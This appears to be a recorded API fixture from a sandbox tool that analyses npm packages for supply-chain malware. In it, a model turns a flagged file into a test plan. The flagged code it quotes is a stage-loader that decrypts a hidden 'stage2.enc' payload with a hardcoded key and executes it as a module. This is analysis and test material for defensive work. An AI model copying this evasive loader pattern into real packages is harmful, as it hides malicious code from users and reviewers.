@@ -1,0 +1,70 @@
+{
+  "id": "052_hypothesis_c8a83a96",
+  "role": "hypothesis",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "nvidia/nemotron-3-super-120b-a12b:free",
+      "messages": [
+        {
+          "role": "system",
+          "content": "Turn one flagged region into one testable security hypothesis and a runnable\nexperiment. Plant bait, defeat visible gates, and trigger a real package entry\npoint. You are not the final judge; the observed run decides. Never dismiss a\nflag because the code appears benign."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent\n- statedPurpose: DNS resolution with caching\n- expectedCapabilities: perform DNS resolution, cache DNS query results\n\n## Flag\n- file: lib/loader.js\n- lines: 13-40\n- why: Reads an encrypted file (stage2.enc), decrypts it with a hardcoded key, and compiles it as a new module; this is a classic stage-loading / evasion technique.\n\n## Entry points\n- install: install-hook.js\n- runtime: index.js\n- bin: (none)\n\n## Flagged code\n### lib/loader.js\n```\n1: const SAFE_TEST_MODE = true;\n2: \n3: const crypto = require(\"crypto\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: \n7: const _k1 = \"s4ndw0rm\";\n8: const _k2 = \"_k3y_\";\n9: const _k3 = \"2024\";\n10: const _k4 = \"_v3ry_s3cr3t\";\n11: const KEY_MATERIAL = _k1 + _k2 + _k3 + _k4;\n12: \n13: function loadStage2() {\n14:   const encryptedPath = path.join(__dirname, \"stage2.enc\");\n15: \n16:   try {\n17:     const raw = fs.readFileSync(encryptedPath, \"utf-8\").trim();\n18:     const parts = raw.split(\":\");\n19: \n20:     if (parts.length !== 3) return;\n21: \n22:     const iv = Buffer.from(parts[0], \"hex\");\n23:     const authTag = Buffer.from(parts[1], \"hex\");\n24:     const encrypted = parts[2];\n25: \n26:     const key = crypto.createHash(\"sha256\").update(KEY_MATERIAL).digest();\n27: \n28:     const decipher = crypto.createDecipheriv(\"aes-256-gcm\", key, iv);\n29:     decipher.setAuthTag(authTag);\n30: \n31:     let decrypted = decipher.update(encrypted, \"hex\", \"utf8\");\n32:     decrypted += decipher.final(\"utf8\");\n33: \n34:     const Module = require(\"module\");\n35:     const m = new Module();\n36:     m._compile(decrypted, \"stage2.js\");\n37:   } catch (e) {\n38: \n39:   }\n40: }\n41: \n42: loadStage2();\n```\n\n## Available setup mechanisms\n- setEnv (setup): Inject environment variables to plant credentials or defeat environment gates.\n- plantFiles (setup): Seed absolute-path files such as /home/node/.npmrc with bait content.\n- setDate (setup): Freeze wall-clock time at an ISO timestamp using libfaketime.\n- stubUrl (setup): Return canned HTTP responses for URL patterns using * as wildcard.\n- patchFile (setup): Rewrite package files with exact string replacements before execution.\n- preload (setup): Inject a Node preload script before the package entrypoint loads.\n- trigger (trigger): Invoke exactly one entrypoint, lifecycle hook, bin, or subpath.\n\nReturn one JSON plan matching the supplied schema. Use empty arrays or null for setup mechanisms that are not needed. Set triggerTarget to exactly one of: index.js, install-hook.js, lib/loader.js. If exercising a library API requires custom JavaScript, put that program in triggerTarget; it will be planted as /pkg/npmguard-driver.js and executed inside the sandbox. The sandbox starts without CI; do not inject CI='false' to defeat a truthiness gate because non-empty strings are truthy in JavaScript.\n\nWhen you author JavaScript (a preload script, a custom driver, or a patchFile replacement), reference package files by a relative path with a leading './' (require('./src/x.js')) or by an absolute path under /pkg (require('/pkg/src/x.js')). A bare specifier like require('src/x.js') is resolved as a node_modules PACKAGE and fails with \"Cannot find module\". Planted file paths must be absolute (/pkg/... or /home/node/...). The sandbox working directory is /pkg.\n\nSuggested bait canary: NPMGUARD_CANARY_TOKEN_f8e2d91a"
+        },
+        {
+          "role": "assistant",
+          "content": "{\"setEnv\": [], \"plantFiles\": [], \"setDate\": null, \"stubUrl\": null, \"patchFile\": null, \"preload\": \"console.log('NPMGUARD_CANARY_TOKEN_f8e2d91a');\", \"triggerTarget\": \"index.js\"}"
+        },
+        {
+          "role": "user",
+          "content": "Your previous reply failed validation: parse: 10 validation errors for HypothesisPlan\ndescription\n  Field required [type=missing, input_value={'setEnv': [], 'plantFile...ggerTarget': 'index.js'}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nclaim\n  Field required [type=missing, input_value={'setEnv': [], 'plantFile...ggerTarget': 'index.js'}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nseverity\n  Field required [type=missing, input_value={'setEnv': [], 'plantFile...ggerTarget': 'index.js'}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nsetup\n  Field required [type=missing, input_value={'setEnv': [], 'plantFile...ggerTarget': 'index.js'}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing\nsetEnv\n  Extra inputs are not permitted [type=extra_forbidden, input_value=[], input_type=list]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\nplantFiles\n  Extra inputs are not permitted [type=extra_forbidden, input_value=[], input_type=list]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\nsetDate\n  Extra inputs are not permitted [type=extra_forbidden, input_value=None, input_type=NoneType]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\nstubUrl\n  Extra inputs are not permitted [type=extra_forbidden, input_value=None, input_type=NoneType]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\npatchFile\n  Extra inputs are not permitted [type=extra_forbidden, input_value=None, input_type=NoneType]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\npreload\n  Extra inputs are not permitted [type=extra_forbidden, input_value=\"console.log('NPMGUARD_CANARY_TOKEN_f8e2d91a');\", input_type=str]\n    For further information visit https://errors.pydantic.dev/2.13/v/extra_forbidden\nReply again, following the required format exactly."
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-c8a83a96",
+      "model": "nvidia/nemotron-3-super-120b-a12b:free",
+      "provider": "Nvidia",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "stop",
+          "message": {
+            "role": "assistant",
+            "content": "{\"description\": \"Investigate the suspicious decryption and module compilation in lib/loader.js to verify if it loads a hidden stage2 payload.\", \"claim\": \"The package uses a hardcoded key to decrypt stage2.enc and execute it as a module, indicating a staged malicious payload.\", \"severity\": \"high\", \"setup\": {\"setEnv\": [], \"plantFiles\": [], \"setDate\": null, \"stubUrl\": null, \"patchFile\": null, \"preload\": null}, \"triggerTarget\": \"index.js\"}",
+            "reasoning": [
+              {
+                "type": "reasoning.text",
+                "text": "We need to produce a JSON plan matching the supplied schema. The schema includes fields: description, claim, severity, setup (which itself includes setEnv, plantFiles, setDate, stubUrl, patchFile, preload), triggerTarget.\n\nThe previous attempt omitted description, claim, severity, setup. Also incorrectly used top-level keys for setup fields. We need to correct.\n\nLet's construct:\n\n{\n \"description\": \"...\",\n \"claim\": \"...\",\n \"severity\": \"high\" (or low/medium etc),\n \"setup\": {\n   \"setEnv\": [],\n   \"plantFiles\": [],\n   \"setDate\": null,\n   \"stubUrl\": null,\n   \"patchFile\": null,\n   \"preload\": \"console.log('NPMGUARD_CANARY_TOKEN_f8e2d91a');\"\n },\n \"triggerTarget\": \"index.js\"\n}\n\nMake sure preload is a string (the script). If we don't need any setup, we can set empty arrays and nulls.\n\nWe need to ensure we match the exact schema: description (string), claim (string), severity (string? maybe enum like \"low\",\"medium\",\"high\",\"critical\"), setup (object with those fields), triggerTarget (string).\n\nLet's fill description: \"Test if loader.js decrypts and executes stage2.enc via hardcoded key, indicating malicious stage-loading.\" Claim: \"The package contains a hidden payload loader that decrypts and executes external code.\" Severity: \"high\". Setup: we can leave empty. TriggerTarget: \"index.js\". Preload script optional; we can keep as null or empty string? The schema expects preload: string? Probably can be null. We can set null.\n\nThus:\n\n{\n \"description\": \"Investigate the suspicious decryption and module compilation in lib/loader.js to verify if it loads a hidden stage2 payload.\",\n \"claim\": \"The package uses a hardcoded key to decrypt stage2.enc and execute it as a module, indicating a staged malicious payload.\",\n \"severity\": \"high\",\n \"setup\": {\n   \"setEnv\": [],\n   \"plantFiles\": [],\n   \"setDate\": null,\n   \"stubUrl\": null,\n   \"patchFile\": null,\n   \"preload\": null\n },\n \"triggerTarget\": \"index.js\"\n}\n\nMake sure JSON is valid. No trailing commas. Let's output exactly that.\n\n",
+                "format": "unknown",
+                "index": 0
+              }
+            ]
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 1678,
+        "completion_tokens": 612,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "71b8d4f63898",
+    "transport": "json_object",
+    "recordedStatus": "invalid_output",
+    "recordedTs": "2026-07-23T10:47:23.302Z",
+    "recordedLatencyMs": 4595
+  }
+}
